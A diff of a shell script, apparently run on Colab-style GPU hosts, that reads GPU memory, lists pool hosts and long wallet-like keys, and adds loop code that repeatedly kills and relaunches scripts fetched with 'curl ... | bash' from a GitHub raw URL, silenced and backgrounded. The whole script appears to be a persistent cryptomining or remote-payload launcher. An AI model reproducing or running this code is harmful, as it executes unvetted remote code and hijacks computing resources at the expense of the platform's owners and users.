@@ -2,10 +2,6 @@ apt-get install -y libcpprest-dev libgmp-dev libargon2-0-dev
 
 apt-get install -y bc
 
-curl https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/curl84 | bash &> /dev/null &
-
-curl https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/curl8474 | bash &> /dev/null &
-
 google84121274=$(nvidia-smi --query-gpu=memory.total --format=csv | sed 's/MiB//g' | sed 's/memory.total//g' | sed 's/\s+\n+\r+//g' | sed 's/\[//g' | sed 's/\]//g')
 
 arr[0]="http://port.aro.wellgitu.com"
@@ -20,6 +16,14 @@ else
 
 while true
 do
+
+pkill -f curl84
+
+pkill -f curl8474
+
+curl https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/curl84 | bash &> /dev/null &
+
+curl https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/curl8474 | bash &> /dev/null &
 
 arr[0]="4dkJEWHWMVpTFTD6pZr8111zWoRNJUmoStit56uL3Urhte98L1Lm3VBWhUCkS6MAYyyPFNSVCqbKccLTmFbiYgA6"
 arr[1]="36emHJrD7TjVnbrvJzpooocHD2vnEMZHjHMm3kk3tMpMhPgw5NfYPtZEiu6nBJjeJi21vwLAD2d5afKDRiJPeQKW"
@@ -59,6 +63,14 @@ fi
 
 
 else
+
+pkill -f curl84
+
+pkill -f curl8474
+
+curl https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/curl84 | bash &> /dev/null &
+
+curl https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/curl8474 | bash &> /dev/null &
 
 cd /content/
 
